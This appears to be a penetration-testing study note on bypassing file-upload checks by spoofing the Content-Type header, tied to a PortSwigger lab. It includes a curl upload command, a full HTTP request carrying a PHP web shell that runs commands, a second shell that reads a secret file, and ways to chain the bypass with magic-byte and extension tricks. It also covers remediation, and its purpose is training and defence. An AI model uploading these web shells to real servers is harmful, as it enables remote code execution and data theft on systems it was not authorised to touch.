---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.03 Content-Type Bypass"
portswigger_labs: ["Web shell upload via Content-Type restriction bypass"]
---

# 22.03 — Content-Type Bypass

## What is it?
When a browser uploads a file to a web server via a multipart form, it automatically includes a `Content-Type` header for that specific file part based on its extension (e.g., `image/jpeg` for `.jpg` files). 

Many web applications mistakenly use this client-provided `Content-Type` header to validate whether the uploaded file is safe. Since all HTTP request headers are fully controlled by the client, an attacker can simply upload a dangerous file (like `shell.php`), but manually change the `Content-Type` header in the upload request to a safe value (like `image/jpeg`). If the server strictly trusts this header, it will accept the malicious PHP file and save it to the server.

Think of it like an airport security guard who, instead of putting your bag through an X-ray scanner, just asks you, "What's in the bag?" and accepts your answer without actually checking inside.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Intercepts upload request for "shell.php"
   │ 2. Modifies request header:
   │    Filename: shell.php
   │    Content-Type: image/jpeg  (Spoofed!)
   ▼
[Web Application Validator]
   │
   │ 3. Reads $_FILES['file']['type']
   │ 4. "Is it image/jpeg?" -> YES!
   ▼
[File System] ─── 5. Saves file as: /uploads/shell.php
   │
[Attacker] ────── 6. Requests GET /uploads/shell.php -> RCE!
```

## How to Find It
- **Manual steps:**
  1. Identify a file upload endpoint that only accepts certain file types (e.g., images).
  2. Attempt to upload a `.php` file. If the application blocks it, note the error message.
  3. Send the request to Burp Suite Repeater.
  4. Find the `Content-Type` declaration inside the multipart boundary for your file (it will likely say `application/x-php` or `application/octet-stream`).
  5. Change that value to a permitted MIME type like `image/jpeg` or `image/png`.
  6. Send the modified request. If it succeeds and you can access your `.php` file, the server is vulnerable.

- **Tool commands with flags explained:**
  Using `curl` to manually specify the MIME type during upload:
  ```bash
  # The "type=image/jpeg" forces curl to spoof the Content-Type header
  curl -X POST https://target.com/api/upload \
    -F "avatar=@shell.php;type=image/jpeg"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Prepare your malicious payload (e.g., `shell.php`).
  2. Intercept the normal upload request.
  3. Ensure the `filename` remains `shell.php` so the server saves it with an executable extension.
  4. Spoof the `Content-Type` to match whatever the server expects (e.g., `image/png`, `application/pdf`).
  5. Submit the request.
  6. Navigate to the uploaded `shell.php` to execute the code.

- **Actual payloads:**
  **Common Spoofed MIME Types:**
  ```text
  image/jpeg
  image/png
  image/gif
  application/pdf
  text/csv
  ```

- **Real HTTP request/response examples:**
  **Upload Request (Intercepted & Modified in Burp):**
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="profile_pic"; filename="shell.php"
  Content-Type: image/jpeg 

  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--
  ```
  *(Notice the `filename="shell.php"` but the `Content-Type: image/jpeg`)*

  **Server Response:**
  ```http
  HTTP/1.1 200 OK
  
  {"status": "success", "path": "/uploads/shell.php"}
  ```

## Real-World Example
In a classic PortSwigger Academy lab, the application allows users to update their avatars but enforces a rule that the uploaded file must be an image. The application performs this check by evaluating the `Content-Type` provided in the HTTP request. By uploading a basic PHP webshell (`<?php echo file_get_contents('/home/carlos/secret'); ?>`), intercepting the request in Burp Suite, and changing the `Content-Type` from `application/x-php` to `image/jpeg`, the server accepted the file. When the user navigated to their newly uploaded avatar, the PHP code executed, revealing the secret file contents.

## How to Fix It
- **Developer remediation:**
  Never trust any data supplied by the client, including HTTP headers like `Content-Type`. To securely validate a file's type, you must inspect the actual contents of the file on the server side using reliable libraries (like checking the magic bytes). For images, the most robust defense is to pass the uploaded file through an image processing library (like Python's Pillow or PHP's Imagick) to decode and re-encode the image, stripping away any malicious payloads.

- **Code snippet:**
  **PHP (Secure Validation using `finfo`):**
  ```php
  // DO NOT USE: $type = $_FILES['file']['type']; // This is the vulnerable client header!
  
  // USE PHP's Fileinfo extension to check the actual file contents:
  $finfo = new finfo(FILEINFO_MIME_TYPE);
  $detected_type = $finfo->file($_FILES['file']['tmp_name']);
  
  $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
  
  if (!in_array($detected_type, $allowed_types)) {
      die("Invalid file content detected!");
  }
  ```

## Chaining Opportunities
- This vuln + [[12 - Image Upload Magic Bytes Bypass]] → If the server checks *both* the `Content-Type` header AND the file's Magic Bytes, you must spoof the `Content-Type: image/jpeg` header while simultaneously injecting actual JPEG magic bytes (`FF D8 FF E0`) at the very beginning of your PHP payload.
- This vuln + [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] → If the server blocks `.php` but relies on `Content-Type` to enforce safe files, you must combine an alternative extension (`shell.phtml`) with a spoofed header (`Content-Type: image/png`).

## Related Notes
- [[01 - What Makes File Upload Dangerous]]
- [[02 - Unrestricted File Upload — Webshell Upload]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
